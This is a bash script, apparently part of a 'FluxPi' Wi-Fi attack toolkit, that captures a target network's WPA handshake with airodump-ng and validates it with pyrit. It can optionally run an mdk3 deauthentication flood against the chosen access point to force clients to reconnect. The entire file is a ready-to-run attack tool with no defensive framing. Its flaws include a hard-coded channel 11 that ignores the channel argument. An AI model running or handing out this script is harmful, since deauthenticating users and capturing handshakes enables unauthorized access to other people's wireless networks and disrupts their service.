#!/bin/bash

if (( $# < 2 ));
  then
    printf "You need to provide positional arguments - bssid and channel.\nStart the script like this:\nsudo ./HandshakePi.sh ex:am:pl:eb:ss:id 6\n"
    exit 1
fi
printf "Wait for the handshake xx:xx:xx:xx:xx to apear in the top right corner then close the xterm window...\n"
read -p "Would you also like to start mdk3 deauth (y/n)?" choice
printf "\n"
rm dump*
if [ $choice != "y" ]; then
xterm -bg black -fg "#CCCC00" -title "FluxPi airodump-ng Service" -e "sudo airodump-ng wlan0 --bssid $1 -w ./dump"
else
echo -e "$1" > "blck.txt"
sleep 1
xterm -bg black -fg "#CCCC00" -title "MDK3 Deauth heler" -e "sudo mdk3 wlan0 d -c 11 -b blck.txt" &
xterm -bg black -fg "#CCCC00" -title "FluxPi airodump-ng Service" -e "sudo airodump-ng wlan0 --bssid $1 -w ./dump"
fi
killall xterm
printf "Checking if handshake is valid\n"
hashData=$(pyrit -r dump-01.cap -o tmp.cap stripLive | grep "")

if [[ $hashData == *", good,"* ]]; then
        printf "Handshake acquired !\nYou can now use fluxPi.sh\n"
else
	printf "Handshake isn't valid, try again using ./HandshakePi.sh\n"
fi
exit 1
